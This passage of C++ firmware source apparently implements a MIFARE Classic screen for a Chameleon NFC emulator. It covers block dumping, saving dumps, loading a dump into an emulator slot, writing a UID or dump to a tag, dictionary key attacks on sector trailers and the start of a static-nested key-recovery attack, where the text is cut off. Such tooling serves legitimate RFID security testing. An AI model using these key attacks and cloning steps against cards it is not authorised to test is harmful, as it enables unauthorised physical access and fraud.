        }
      }

      if (nl >= (int)normalized.length()) break;
      pos = nl + 1;
    }
  };

  char uid[24] = {};
  for (uint8_t i = 0; i < _uidLen; ++i) {
    char b[4];
    snprintf(b, sizeof(b), "%02X%s", _uid[i], (i + 1 < _uidLen) ? ":" : "");
    strcat(uid, b);
  }

  const char* type = (_sectors == 5) ? "MF Classic Mini"
                   : (_sectors == 40) ? "MF Classic 4K"
                                      : "MF Classic 1K";
  addRow("Type", type);
  addRow("UID", uid);
  char atqa[8];
  snprintf(atqa, sizeof(atqa), "%02X:%02X", _atqa[0], _atqa[1]);
  addRow("ATQA", atqa);
  char sak[6];
  snprintf(sak, sizeof(sak), "%02X", _sak);
  addRow("SAK", sak);
  addRow("Sectors", String((unsigned)_sectors));
  addRow("Blocks", String(_dumpReadBlocks) + "/" + String(_dumpBlocks));
  uint8_t sectorsWithKey = 0;
  for (uint8_t s = 0; s < _sectors; ++s) {
    if (_foundA[s] || _foundB[s]) ++sectorsWithKey;
  }
  addRow("Keys", String((unsigned)sectorsWithKey) + "/" + String((unsigned)_sectors) + " sectors");
  addRow("Status", _dumpReadBlocks == _dumpBlocks ? "Complete" : "Partial");
  addRow("Dump", String(_dumpLen) + " bytes");

  uint8_t* ndef = nullptr;
  size_t ndefLen = 0;
  NdefParser::Result parsed;
  if (_extractDumpNdef(&ndef, &ndefLen) && NdefParser::parse(ndef, ndefLen, parsed)) {
    switch (parsed.kind) {
      case NdefParser::RECORD_TEXT:
        addRow("NDEF", "Text");
        if (parsed.language.length()) addRow("Language", parsed.language);
        if (parsed.text.length()) addWrappedRow("Text", parsed.text);
        break;
      case NdefParser::RECORD_URL:
        addRow("NDEF", "URL");
        addWrappedRow("URL", parsed.uri);
        break;
      case NdefParser::RECORD_PHONE:
        addRow("NDEF", "Phone");
        addWrappedRow("Phone", parsed.phone);
        break;
      case NdefParser::RECORD_EMAIL:
        addRow("NDEF", "Email");
        addWrappedRow("Email", parsed.email);
        break;
      case NdefParser::RECORD_VCARD:
        addRow("NDEF", "vCard");
        if (parsed.contact.length()) addWrappedRow("Contact", parsed.contact);
        if (parsed.company.length()) addWrappedRow("Company", parsed.company);
        if (parsed.address.length()) addWrappedRow("Address", parsed.address);
        if (parsed.phone.length()) addWrappedRow("Phone", parsed.phone);
        if (parsed.email.length()) addWrappedRow("Email", parsed.email);
        if (parsed.website.length()) addWrappedRow("Website", parsed.website);
        break;
      default:
        addRow("NDEF", "Unsupported");
        break;
    }
  } else {
    addRow("NDEF", "Not found");
  }
  if (ndef) free(ndef);

  addRow("[Press]", "Actions");
  _scrollView.setRows(_rows, _rowCount);
}

void ChameleonMfcScreen::_buildDumpHex() {
  _rowCount = 0;
  if (!_dump || !_dumpLen) return;
  for (uint16_t block = 0; block < _dumpBlocks && _rowCount + 1 < MAX_ROWS; ++block) {
    for (uint8_t half = 0; half < 2; ++half) {
      char label[16];
      snprintf(label, sizeof(label), "B%u %s", (unsigned)block, half ? "8-F" : "0-7");
      String value;
      const uint8_t* data = _dump + (size_t)block * 16u + half * 8u;
      for (uint8_t i = 0; i < 8; ++i) {
        char b[3];
        snprintf(b, sizeof(b), "%02X", data[i]);
        value += b;
      }
      _rowLabels[_rowCount] = label;
      _rowValues[_rowCount] = value;
      _rows[_rowCount] = {_rowLabels[_rowCount].c_str(), _rowValues[_rowCount].c_str()};
      ++_rowCount;
    }
  }
  _scrollView.setRows(_rows, _rowCount);
  _scrollView.resetScroll();
}

void ChameleonMfcScreen::_loadDumpToSlot() {
  Header header; header.render("Load Dump to Slot");
  if (!_dump || !_dumpLen) return;
  const uint16_t tagType = _sectors == 5 ? 1000 : (_sectors == 40 ? 1003 : 1001);

  InputSelectAction::Option opts[8];
  String labels[8], vals[8];
  for (uint8_t i = 0; i < 8; ++i) {
    labels[i] = String("Slot ") + (i + 1);
    vals[i] = String(i);
    opts[i] = {labels[i].c_str(), vals[i].c_str()};
  }
  const char* r = InputSelectAction::popup("Load Dump to Slot", opts, 8, nullptr);
  if (!r) { render(); return; }
  const uint8_t slot = (uint8_t)atoi(r);
  if (slot >= 8) { render(); return; }

  // Restore Tag Details after the slot picker before progress/status UI.
  render();

  auto& c = ChameleonClient::get();
  uint8_t previousSlot = 0, previousMode = 0;
  const bool restoreSlot = c.getActiveSlot(&previousSlot) && previousSlot != slot;
  const bool restoreMode = c.getMode(&previousMode);
  auto restoreContext = [&]() {
    if (restoreSlot) c.setActiveSlot(previousSlot);
    if (restoreMode) c.setMode(previousMode);
  };

  bool ok = c.setSlotTagType(slot, tagType) &&
            c.setSlotDataDefault(slot, tagType) &&
            c.setActiveSlot(slot);
  if (ok) {
    uint8_t aco[12] = {};
    aco[0] = _uidLen;
    memcpy(aco + 1, _uid, _uidLen);
    // Classic scan data is not retained separately; derive the standard
    // anti-collision values from the detected Classic variant.
    aco[1 + _uidLen] = _atqa[0];
    aco[2 + _uidLen] = _atqa[1];
    aco[3 + _uidLen] = _sak;
    aco[4 + _uidLen] = 0;
    uint16_t st = 0;
    ok = c.sendCommand(ChameleonClient::CMD_MF1_SET_ANTI_COLL,
                       aco, 5 + _uidLen, nullptr, nullptr, &st) &&
         (st == 0 || st == 0x68);
  }

  if (ok) {
    ProgressView::init();
    uint16_t done = 0;
    while (done < _dumpBlocks && ok) {
      const uint8_t count = (uint8_t)min((uint16_t)8, (uint16_t)(_dumpBlocks - done));
      char msg[40];
      snprintf(msg, sizeof(msg), "Loading %u/%u blocks", (unsigned)done, (unsigned)_dumpBlocks);
      ProgressView::progress(msg, (int)((uint32_t)done * 100u / _dumpBlocks));
      ok = c.mf1LoadBlockData(slot, (uint8_t)done,
                              _dump + (size_t)done * 16u,
                              (uint16_t)count * 16u);
      done += count;
    }
    if (ok) ProgressView::progress("Dump loaded", 100);
    ProgressView::finish();
  }
  if (ok) ok = c.setSlotEnable(slot, 2, true);
  restoreContext();
  render();
  ShowStatusAction::show(ok ? "Loaded to slot" : "Failed", 1600);
  render();
}

void ChameleonMfcScreen::_showDumpActions() {
  static const InputSelectAction::Option opts[] = {
    {"View Dump",          "view"},
    {"Save UID",           "uid"},
    {"Save Dump",          "save"},
    {"Load Dump to Slot",  "slot"},
    {"Write UID to Tag",     "writeuid"},
    {"Write Dump to Tag", "write"},
  };
  const char* r = InputSelectAction::popup("Dump Actions", opts, 6, nullptr);
  if (!r) { render(); return; }
  render();
  if (strcmp(r, "view") == 0) {
    _buildDumpHex();
    _state = STATE_DUMP_HEX;
    render();
  } else if (strcmp(r, "uid") == 0) {
    _saveUid();
  } else if (strcmp(r, "save") == 0) {
    _saveDump();
  } else if (strcmp(r, "slot") == 0) {
    _loadDumpToSlot();
  } else if (strcmp(r, "writeuid") == 0) {
    Screen.push(new ChameleonMfcUidWriteScreen(_uid, _uidLen));
  } else if (_dumpLen != 1024) {
    ShowStatusAction::show("Classic 1K only for now", 1600);
    render();
  } else {
    Screen.push(new ChameleonMfcWriteScreen(_dump, _dumpLen, _uid, _uidLen));
  }
}

void ChameleonMfcScreen::_saveUid() {
  if (!_uidLen || !Uni.Storage || !Uni.Storage->isAvailable()) {
    ShowStatusAction::show("Storage unavailable", 1200); render(); return;
  }
  const char* typeName = ChameleonClient::tagTypeName(
      _sectors == 5 ? 1000 : (_sectors == 40 ? 1003 : 1001));
  String safeType = String(typeName);
  safeType.replace(" / ", "-");
  safeType.replace(" ", "-");
  String suggested = safeType + "_";
  char h[3];
  for (uint8_t i = 0; i < _uidLen; ++i) { snprintf(h, sizeof(h), "%02X", _uid[i]); suggested += h; }
  String name = InputTextAction::popup("Save UID", suggested);
  if (InputTextAction::wasCancelled() || name.length() == 0) { render(); return; }
  if (name.endsWith(".uid")) name.remove(name.length() - 4);
  const String filename = name + ".uid";
  Uni.Storage->makeDir("/unigeek"); Uni.Storage->makeDir("/unigeek/nfc");
  Uni.Storage->makeDir("/unigeek/nfc/uids");
  const bool ok = IdentityFile::saveNfcUid(String("/unigeek/nfc/uids/") + filename, _uid, _uidLen);
  render();
  ShowStatusAction::show(ok ? (String("Saved: ") + filename).c_str() : "Failed", 1600);
  render();
}

void ChameleonMfcScreen::_saveDump() {
  if (!_dump || !_dumpLen || !Uni.Storage || !Uni.Storage->isAvailable()) {
    ShowStatusAction::show("Failed", 1200);
    render();
    return;
  }

  String safeType = String(ChameleonClient::tagTypeName(
      _sectors == 5 ? 1000 : (_sectors == 40 ? 1003 : 1001)));
  safeType.replace(" / ", "-");
  safeType.replace(" ", "-");
  String suggested = safeType + "_";
  char h[3];
  for (uint8_t i = 0; i < _uidLen; ++i) {
    snprintf(h, sizeof(h), "%02X", _uid[i]);
    suggested += h;
  }

  String name = InputTextAction::popup("Save Dump", suggested);
  if (InputTextAction::wasCancelled() || name.length() == 0) {
    render();
    return;
  }

  // Clear the text-input overlay before filesystem I/O and status feedback.
  render();

  if (name.endsWith(".bin")) name.remove(name.length() - 4);
  String filename = name + ".bin";

  Uni.Storage->makeDir("/unigeek");
  Uni.Storage->makeDir("/unigeek/nfc");
  Uni.Storage->makeDir("/unigeek/nfc/dumps");

  String path = String("/unigeek/nfc/dumps/") + filename;
  fs::File f = Uni.Storage->open(path.c_str(), "w");
  bool ok = false;
  if (f) {
    ok = f.write(_dump, _dumpLen) == _dumpLen;
    f.close();
  }

  render();
  if (ok) {
    String msg = String("Saved: ") + filename;
    ShowStatusAction::show(msg.c_str(), 1600);
    int n = Achievement.inc("chameleon_mfc_dump");
    if (n == 1) Achievement.unlock("chameleon_mfc_dump");
    render();
    return;
  } else {
    ShowStatusAction::show("Failed", 1200);
  }
  render();
}

void ChameleonMfcScreen::_callDump() {
  _freeDump();
  _state   = STATE_DUMP;
  _running = true;

  auto& c = ChameleonClient::get();
  c.setMode(1);

  _dumpBlocks = _totalBlocks();
  _dumpReadBlocks = 0;
  _dumpLen = (uint16_t)(_dumpBlocks * 16u);
  _dump = (uint8_t*)malloc(_dumpLen);
  if (!_dump) {
    c.setMode(0);
    _dumpLen = 0;
    _running = false;
    render();
    ShowStatusAction::show("Out of memory", 1200);
    Screen.goBack();
    return;
  }

  ProgressView::init();
  char progressMsg[40];
  snprintf(progressMsg, sizeof(progressMsg), "Reading blocks (0/%u)...", (unsigned)_dumpBlocks);
  ProgressView::progress(progressMsg, 0);

  for (uint16_t block = 0; block < _dumpBlocks; block++) {
    uint8_t s = (block < 128) ? (uint8_t)(block / 4)
                              : (uint8_t)(32 + (block - 128) / 16);

    uint8_t data[16] = {};
    bool ok = false;
    if (_foundA[s]) ok = c.mf1ReadBlock(block, 0x60, _keysA[s], data);
    if (!ok && _foundB[s]) ok = c.mf1ReadBlock(block, 0x61, _keysB[s], data);
    if (!ok) memset(data, 0, 16);
    else ++_dumpReadBlocks;

    if (block == _trailerBlock(s)) {
      if (_foundA[s]) memcpy(data, _keysA[s], 6);
      if (_foundB[s]) memcpy(data + 10, _keysB[s], 6);
    }
    memcpy(_dump + (size_t)block * 16u, data, 16);

    snprintf(progressMsg, sizeof(progressMsg), "Reading blocks (%u/%u)...",
             (unsigned)(block + 1u), (unsigned)_dumpBlocks);
    ProgressView::progress(progressMsg,
        (int)((uint32_t)(block + 1u) * 100u / _dumpBlocks));
  }

  ProgressView::finish();
  c.setMode(0);
  _running = false;
  _state = STATE_DUMP_RESULT;
  _buildDumpPreview();
  render();  // BaseScreen redraws header + sidebar before the result body.
  StatusBar::refresh();
}

// ── Dictionary Attack ──

void ChameleonMfcScreen::_loadDictPicker() {
  if (_dictPickDir.length() == 0) _dictPickDir = _kDictDir;
  _browser.root = _kDictDir;
  uint8_t n = _browser.load(this, _dictPickDir, ".txt", nullptr, BrowseFileView::STEM);

  if (_dictPickDir == _kDictDir) {
    uint8_t out = 0;
    _dictItems[out++] = {"Default"};
    _dictItems[out++] = {"Discovered"};
    _dictItems[out++] = {"Extended"};
    for (uint8_t i = 0; i < n; ++i)
      if (_browser.entry(i).path != MfcKeyStore::kDiscoveredDictionary) _dictItems[out++] = _browser.items()[i];
    _dictFileCount = n;
    _state = STATE_DICT_SEL;
    setItems(_dictItems, out);
  } else {
    _dictFileCount = n;
    _state = STATE_DICT_SEL;
    setItems(_browser.items(), n);
  }
  render();
}

static bool _parseChameleonMfcKey(const String& line, uint8_t out[6]) {
  String s = line;
  s.trim();
  if (s.length() == 0 || s.startsWith("#")) return false;
  s.replace(":", "");
  s.replace(" ", "");
  if (s.length() != 12) return false;
  for (int i = 0; i < 6; i++) {
    char hex[3] = { s[i * 2], s[i * 2 + 1], 0 };
    char* end = nullptr;
    unsigned long v = strtoul(hex, &end, 16);
    if (*end != 0) return false;
    out[i] = (uint8_t)v;
  }
  return true;
}

ChameleonMfcScreen::DictControl ChameleonMfcScreen::_standaloneDictHook(
    ChameleonMfcScreen* self, const DictAttempt& attempt, bool pre) {
  if (pre) {
    Uni.update();
    if (Uni.Nav && Uni.Nav->wasPressed() &&
        Uni.Nav->readDirection() == INavigation::DIR_BACK) {
      return DictControl::Cancel;
    }
    char current[48];
    snprintf(current, sizeof(current),
             "S%d %c %02X%02X%02X%02X%02X%02X",
             attempt.sector, attempt.type,
             attempt.key[0], attempt.key[1], attempt.key[2],
             attempt.key[3], attempt.key[4], attempt.key[5]);
    strncpy(self->_actionAttempt, current, sizeof(self->_actionAttempt)-1); self->_actionAttempt[sizeof(self->_actionAttempt)-1]=0;
    self->_actionPct = attempt.total ? (int)(((uint64_t)attempt.index + 1U) * 100U / attempt.total) : 0;
    self->_actionLog.draw(Uni.Lcd, self->bodyX(), self->bodyY(),
                          self->bodyW(), self->bodyH(), _actionStatusBarCb, self);
    return DictControl::Continue;
  }

  char line[48];
  snprintf(line, sizeof(line), "S%d %c: %02X%02X%02X%02X%02X%02X",
           attempt.sector, attempt.type,
           attempt.key[0], attempt.key[1], attempt.key[2],
           attempt.key[3], attempt.key[4], attempt.key[5]);
  // The next pre-attempt redraw will show this result together with the next
  // key. Avoid a second redraw per attempt, which causes visible flicker.
  self->_actionLog.addLine(line, attempt.authed ? TFT_GREEN : TFT_RED);
  return DictControl::Continue;
}

ChameleonMfcScreen::DictControl ChameleonMfcScreen::_chainDictHook(
    ChameleonMfcScreen* self, const DictAttempt& attempt, bool pre) {
  if (pre) {
    char current[48];
    snprintf(current, sizeof(current),
             "S%d %c %02X%02X%02X%02X%02X%02X",
             attempt.sector, attempt.type,
             attempt.key[0], attempt.key[1], attempt.key[2],
             attempt.key[3], attempt.key[4], attempt.key[5]);
    strncpy(self->_actionAttempt, current, sizeof(self->_actionAttempt)-1); self->_actionAttempt[sizeof(self->_actionAttempt)-1]=0;
    self->_actionPct = attempt.total ? (int)(((uint64_t)attempt.index + 1U) * 100U / attempt.total) : 0;
    self->_actionLog.draw(Uni.Lcd, self->bodyX(), self->bodyY(),
                          self->bodyW(), self->bodyH(), _actionStatusBarCb, self);

    Uni.update();
    if (Uni.Nav && Uni.Nav->wasPressed() &&
        Uni.Nav->readDirection() == INavigation::DIR_BACK)
      return DictControl::Cancel;
    return DictControl::Continue;
  }

  char line[48];
  snprintf(line, sizeof(line), "S%d %c: %02X%02X%02X%02X%02X%02X",
           attempt.sector, attempt.type,
           attempt.key[0], attempt.key[1], attempt.key[2],
           attempt.key[3], attempt.key[4], attempt.key[5]);
  self->_actionLog.addLine(line, attempt.authed ? TFT_GREEN : TFT_RED);
  // The next pre-attempt redraw carries the result, avoiding a second redraw.
  if (attempt.authed && self->_recoverObjectiveMet())
    return DictControl::ObjectiveMet;
  return DictControl::Continue;
}

ChameleonMfcScreen::DictControl ChameleonMfcScreen::_applyDictionaryKeys(
    const uint8_t keys[][6], uint16_t keyCount,
    DictControl (*hook)(ChameleonMfcScreen*, const DictAttempt&, bool pre)) {
  auto& c = ChameleonClient::get();
  const uint32_t totalWork = (uint32_t)_sectors * 2U;

  // Attack Chain presents dictionary progress by dictionary key, so walk the
  // dictionary first and test that key against every still-missing slot. This
  // keeps "x/y" monotonic and truthful: x is the key currently being tested,
  // while the progress bar tracks the individual authentication attempts.
  if (hook == _chainDictHook) {
    uint32_t pendingSlots = 0;
    for (uint8_t s = 0; s < _sectors; ++s) {
      if (!_foundA[s]) ++pendingSlots;
      if (!_foundB[s]) ++pendingSlots;
    }
    const uint32_t totalAttempts = pendingSlots * (uint32_t)keyCount;
    uint32_t attemptNo = 0;

    for (uint16_t k = 0; k < keyCount; ++k) {
      for (uint8_t s = 0; s < _sectors; ++s) {
        const uint8_t block = _trailerBlock(s);
        for (int kt = 0; kt < 2; ++kt) {
          if ((kt == 0) ? _foundA[s] : _foundB[s]) continue;

          const uint8_t keyType = (kt == 0) ? 0x60 : 0x61;
          const char keyTypeCh = (kt == 0) ? 'A' : 'B';
          DictAttempt attempt{s, keyTypeCh, k, keyCount, attemptNo,
                              totalAttempts, keys[k], 0, (int)totalWork, false};
          const DictControl preCtrl = hook(this, attempt, true);
          if (preCtrl != DictControl::Continue) return preCtrl;

          const bool ok = c.mf1CheckKey(block, keyType, keys[k]);
          ++attemptNo;
          attempt.workIndex = attemptNo;
          attempt.authed = ok;
          if (ok) {
            if (kt == 0) { memcpy(_keysA[s], keys[k], 6); _foundA[s] = true; }
            else         { memcpy(_keysB[s], keys[k], 6); _foundB[s] = true; }
            _recovered++;
            _dictNewFound++;
            if (_trackRecoveryKeys) _keySummary.add(keys[k]);
          }

          const DictControl postCtrl = hook(this, attempt, false);
          if (postCtrl != DictControl::Continue) return postCtrl;
        }
      }
    }
    return DictControl::Continue;
  }

  // Legacy non-chain branch retained for callers that supply a custom hook.
  uint32_t progress = 0;
  for (uint8_t s = 0; s < _sectors; ++s) {
    const uint8_t block = _trailerBlock(s);
    for (int kt = 0; kt < 2; ++kt) {
      const uint8_t keyType = (kt == 0) ? 0x60 : 0x61;
      const char keyTypeCh = (kt == 0) ? 'A' : 'B';
      if ((kt == 0) ? _foundA[s] : _foundB[s]) { ++progress; continue; }

      bool found = false;
      for (uint16_t k = 0; k < keyCount && !found; ++k) {
        DictAttempt attempt{s, keyTypeCh, k, keyCount, 0, 0, keys[k],
                            (int)progress, (int)totalWork, false};
        if (hook) {
          const DictControl ctrl = hook(this, attempt, true);
          if (ctrl != DictControl::Continue) return ctrl;
        }
        const bool ok = c.mf1CheckKey(block, keyType, keys[k]);
        attempt.authed = ok;
        if (ok) {
          if (kt == 0) { memcpy(_keysA[s], keys[k], 6); _foundA[s] = true; }
          else         { memcpy(_keysB[s], keys[k], 6); _foundB[s] = true; }
          _recovered++;
          _dictNewFound++;
          if (_trackRecoveryKeys) _keySummary.add(keys[k]);
          found = true;
        }
        if (hook) {
          const DictControl ctrl = hook(this, attempt, false);
          if (ctrl != DictControl::Continue) return ctrl;
        }
      }

      if (!found && hook == _standaloneDictHook) {
        char nf[32];
        snprintf(nf, sizeof(nf), "  S%d %c: not found", s, keyTypeCh);
        _actionLog.addLine(nf, TFT_RED);
        _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _actionStatusBarCb, this);
      }
      ++progress;
    }
  }
  return DictControl::Continue;
}

ChameleonMfcScreen::DictControl ChameleonMfcScreen::_runChainDictionaries() {
  _dictNewFound = 0;
  _dictError[0] = 0;
  struct Spec { const char* label; const char* source; bool builtin; };
  const Spec dicts[] = {
    {"Default",    MfcKeyStore::kBuiltinDefaultId, true},
    {"Discovered", MfcKeyStore::kDiscoveredDictionary, false},
    {"Extended",   MfcKeyStore::kBuiltinExtendedId, true},
  };

  // Read Tag is quick. Recover owns the full Default -> Discovered -> Extended chain.
  for (size_t dictIndex = 0; dictIndex < sizeof(dicts) / sizeof(dicts[0]); ++dictIndex) {
    const auto& spec = dicts[dictIndex];
    if (_recoverObjectiveMet()) return DictControl::ObjectiveMet;
    strncpy(_actionStatus, spec.label, sizeof(_actionStatus) - 1);
    _actionStatus[sizeof(_actionStatus) - 1] = 0;
    _setChainStage("Dictionary Attack");

    if (spec.builtin) {
      const uint8_t (*keys)[6] = nullptr; size_t count = 0;
      if (!MfcKeyStore::builtinDictionary(spec.source, &keys, &count)) continue;
      DictControl ctrl = _applyDictionaryKeys(keys, (uint16_t)count, _chainDictHook);
      if (ctrl != DictControl::Continue) return ctrl;
      continue;
    }

    // Discovered is optional and may grow large. Stream it key-by-key instead
    // of allocating a buffer proportional to the file size. Each key is tested
    // against every still-missing slot, matching the built-in chain strategy.
    const size_t dictionaryTotal = MfcKeyStore::dictionaryKeyCount(Uni.Storage, spec.source);
    if (!dictionaryTotal) continue;
    uint32_t attemptNo = 0;
    DictControl ctrl = DictControl::Continue;
    MfcKeyStore::forEachDictionaryKey(Uni.Storage, spec.source, [&](const uint8_t key[6], size_t keyIndex, size_t) {
      for (uint8_t s = 0; s < _sectors; ++s) {
        const uint8_t block = _trailerBlock(s);
        for (int kt = 0; kt < 2; ++kt) {
          if ((kt == 0) ? _foundA[s] : _foundB[s]) continue;
          DictAttempt attempt{s, (kt == 0) ? 'A' : 'B', (uint16_t)min(keyIndex,(size_t)UINT16_MAX),
                              (uint16_t)min(dictionaryTotal,(size_t)UINT16_MAX), attemptNo, 0, key,
                              (int)(keyIndex + 1U), (int)dictionaryTotal, false};
          ctrl = _chainDictHook(this, attempt, true); if (ctrl != DictControl::Continue) return false;
          const bool ok = ChameleonClient::get().mf1CheckKey(block, (kt == 0) ? 0x60 : 0x61, key);
          ++attemptNo; attempt.workIndex = (uint32_t)(keyIndex + 1U); attempt.workTotal = (uint32_t)dictionaryTotal; attempt.authed = ok;
          if (ok) { if (kt == 0) { memcpy(_keysA[s],key,6); _foundA[s]=true; } else { memcpy(_keysB[s],key,6); _foundB[s]=true; } ++_recovered; ++_dictNewFound; if (_trackRecoveryKeys) _keySummary.add(key); }
          ctrl = _chainDictHook(this, attempt, false); if (ctrl != DictControl::Continue) return false;
        }
      }
      return true;
    });
    if (_recoverObjectiveMet()) return DictControl::ObjectiveMet;
    if (ctrl != DictControl::Continue) return ctrl;
  }
  return DictControl::Continue;
}

void ChameleonMfcScreen::_runDictAttack() {
  _state   = STATE_DICT_RUN;
  _running = true;

  _actionLog.clear();
  _actionPct = 0;
  _actionAttempt[0] = 0;
  if (_dictSource == MfcKeyStore::kBuiltinDefaultId) strncpy(_actionStatus, "Default", sizeof(_actionStatus) - 1);
  else if (_dictSource == MfcKeyStore::kDiscoveredDictionary) strncpy(_actionStatus, "Discovered", sizeof(_actionStatus) - 1);
  else if (_dictSource == MfcKeyStore::kBuiltinExtendedId) strncpy(_actionStatus, "Extended", sizeof(_actionStatus) - 1);
  else { String label=_dictSource; int slash=label.lastIndexOf('/'); if(slash>=0) label=label.substring(slash+1); if(label.endsWith(".txt")) label.remove(label.length()-4); strncpy(_actionStatus,label.c_str(),sizeof(_actionStatus)-1); }
  _actionStatus[sizeof(_actionStatus) - 1] = 0;
  render();

  auto& c = ChameleonClient::get();
  c.setMode(1);

  _dictNewFound = 0;
  _keySummary.reset();
  _trackRecoveryKeys = true;
  DictControl dictResult = DictControl::Continue;
  const size_t dictionaryTotal = MfcKeyStore::dictionaryKeyCount(Uni.Storage, _dictSource);
  bool cancelled = false;
  MfcKeyStore::forEachDictionaryKey(Uni.Storage, _dictSource, [&](const uint8_t key[6], size_t keyIndex, size_t) {
    for (uint8_t sec = 0; sec < _sectors; ++sec) {
      const uint8_t block = _trailerBlock(sec);
      for (int kt = 0; kt < 2; ++kt) {
        if ((kt == 0) ? _foundA[sec] : _foundB[sec]) continue;
        DictAttempt attempt{sec, kt == 0 ? 'A' : 'B', (uint16_t)min(keyIndex,(size_t)UINT16_MAX),
                            (uint16_t)min(dictionaryTotal,(size_t)UINT16_MAX), 0, 0, key,
                            (int)(keyIndex + 1U), (int)dictionaryTotal, false};
        dictResult = _standaloneDictHook(this, attempt, true);
        if (dictResult != DictControl::Continue) { cancelled = dictResult == DictControl::Cancel; return false; }
        const bool ok = c.mf1CheckKey(block, kt == 0 ? 0x60 : 0x61, key);
        attempt.authed = ok;
        if (ok) {
          if (kt == 0) { memcpy(_keysA[sec], key, 6); _foundA[sec] = true; }
          else { memcpy(_keysB[sec], key, 6); _foundB[sec] = true; }
          ++_recovered; ++_dictNewFound; _keySummary.add(key);
        }
        dictResult = _standaloneDictHook(this, attempt, false);
        if (dictResult != DictControl::Continue) { cancelled = dictResult == DictControl::Cancel; return false; }
      }
    }
    return true;
  });
  if (!cancelled) {
    for (uint8_t sec = 0; sec < _sectors; ++sec) for (int kt = 0; kt < 2; ++kt) {
      if ((kt == 0) ? _foundA[sec] : _foundB[sec]) continue;
      char nf[32]; snprintf(nf,sizeof(nf),"S%u %c: not found",(unsigned)sec,kt?'B':'A');
      _actionLog.addLine(nf,TFT_RED);
    }
  }
  _trackRecoveryKeys = false;
  if (dictResult == DictControl::Cancel) {
    c.setMode(0); _running=false; ShowStatusAction::show("Cancelled",1000); _loadDictPicker(); return;
  }
  const int newFound = _dictNewFound;

  char msg[80];
  _keySummary.format(msg, sizeof(msg), _authenticatedSectors(), _sectors);
  _actionPct = 100;
  char line1[40];
  snprintf(line1, sizeof(line1), "%u %s recovered", (unsigned)_keySummary.count,
           _keySummary.count == 1 ? "key" : "keys");
  char line2[40];
  snprintf(line2, sizeof(line2), "%u/%u sectors authenticated",
           (unsigned)_authenticatedSectors(), (unsigned)_sectors);
  snprintf(_actionStatus, sizeof(_actionStatus), "%s", line1);
  _actionLog.addLine(line1, newFound > 0 ? TFT_GREEN : TFT_RED);
  _actionLog.addLine(line2, TFT_WHITE);
  _actionLog.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _actionStatusBarCb, this);
  ShowStatusAction::show(msg, 1600);

  if (newFound > 0) {
    _saveKeys();
    int n = Achievement.inc("chameleon_dict_attack");
    if (n == 1) Achievement.unlock("chameleon_dict_attack");
    Achievement.setMax("chameleon_mfc_keys_found", _recovered);
    if (_recovered >= 10) Achievement.unlock("chameleon_mfc_keys_found");
  }

  c.setMode(0);
  _running = false;
  _state   = STATE_DICT_LOG;
}

// ── Static Nested Attack ─────────────────────────────────────────────────────

ChameleonMfcScreen::AdvancedAttackResult ChameleonMfcScreen::_callStaticNested() {
  _state   = STATE_STATIC_NESTED;
  _running = true;
  _actionLog.clear();
  _actionPct = 0;
  strncpy(_actionStatus, "Init...", sizeof(_actionStatus) - 1);
  render();

  auto& c = ChameleonClient::get();
  c.setMode(1);

  char m[64];

  // ── Find a known key to use as exploit credential ─────────────────────────
  int knownSec = -1;
  uint8_t knownKType = 0;
  uint64_t knownKey64 = 0;
  for (uint8_t s = 0; s < _sectors && knownSec < 0; s++) {
    if (_foundA[s]) {
      knownSec = s; knownKType = 0x60;
      for (int i = 0; i < 6; i++) knownKey64 = (knownKey64 << 8) | _keysA[s][i];
    } else if (_foundB[s]) {
      knownSec = s; knownKType = 0x61;
      for (int i = 0; i < 6; i++) knownKey64 = (knownKey64 << 8) | _keysB[s][i];
    }
  }
  if (knownSec < 0) {
    _log("No known key to exploit", TFT_RED);
    c.setMode(0);
    _running = false; _state = STATE_STATIC_NESTED_LOG; return AdvancedAttackResult::Failed;
  }
  snprintf(m, sizeof(m), "Exploit: S%d %c key=%012llX",
           knownSec, knownKType == 0x60 ? 'A' : 'B', (unsigned long long)knownKey64);
  _log(m, TFT_CYAN);

  // ── Confirm static nonce via mf1NTLevel (1=static, 2=weak, 3=hard) ────────
  uint8_t ntLevel = 0;
  if (!c.mf1NTLevel(&ntLevel) || ntLevel != 1) {
    snprintf(m, sizeof(m), "Not a static-nonce tag (NTLevel=%d) — abort", (int)ntLevel);
    _log(m, ntLevel == 0 ? TFT_RED : TFT_YELLOW);
    c.setMode(0);
    _running = false; _state = STATE_STATIC_NESTED_LOG; return AdvancedAttackResult::Failed;
  }
  _log("NTLevel=1: static nonce confirmed", TFT_GREEN);

  uint8_t exploitBlock = _trailerBlock((uint8_t)knownSec);
  uint8_t knownKeyBytes[6];
  { uint64_t tmp = knownKey64;
    for (int i = 5; i >= 0; i--) { knownKeyBytes[i] = (uint8_t)(tmp & 0xFF); tmp >>= 8; } }

  uint32_t uid32 = 0;
  for (int i = 0; i < 4 && i < (int)_uidLen; i++)
    uid32 = (uid32 << 8) | _uid[i];
  snprintf(m, sizeof(m), "uid32 = %08lX", (unsigned long)uid32);
  _log(m, TFT_DARKGREY);

  int newKeys = 0;
  MfcRecoverySummary attackSummary;
  int totalTargets = 0;
  for (uint8_t s = 0; s < _sectors; s++)
    for (int kt = 0; kt < 2; kt++)
      if (!((kt == 0) ? _foundA[s] : _foundB[s]))
        totalTargets++;
  int done = 0;
  // Poll navigation inside this synchronous attack: onUpdate() cannot run while _running.
  auto backRequested = [&]() -> bool {
    Uni.update();
    return Uni.Nav && Uni.Nav->wasPressed() &&
           Uni.Nav->readDirection() == INavigation::DIR_BACK;
  };
  auto cancelAttack = [&]() {
    if (newKeys > 0) _saveKeys();  // Retain keys already verified.
    _resumeReadAfterAttack = false; // Never resume Read Tag after cancellation.
    _trackRecoveryKeys = false;
    _chainStage[0] = 0;
    strncpy(_actionStatus, "Cancelled", sizeof(_actionStatus) - 1);
    _actionStatus[sizeof(_actionStatus) - 1] = '\0';
    _log("Cancelled", TFT_YELLOW);
    c.setMode(0);
    _running = false;
    _state = STATE_STATIC_NESTED_LOG;
  };

  // ── Attack each unknown sector/key ────────────────────────────────────────
  for (uint8_t targetSec = 0; targetSec < _sectors; targetSec++) {
    if (backRequested()) { cancelAttack(); return AdvancedAttackResult::Cancelled; }
    for (int kt = 0; kt < 2; kt++) {
      if (backRequested()) { cancelAttack(); return AdvancedAttackResult::Cancelled; }
      uint8_t tKType   = (kt == 0) ? 0x60 : 0x61;
      char    tkc      = (kt == 0) ? 'A'  : 'B';
      uint8_t tBlock   = _trailerBlock(targetSec);

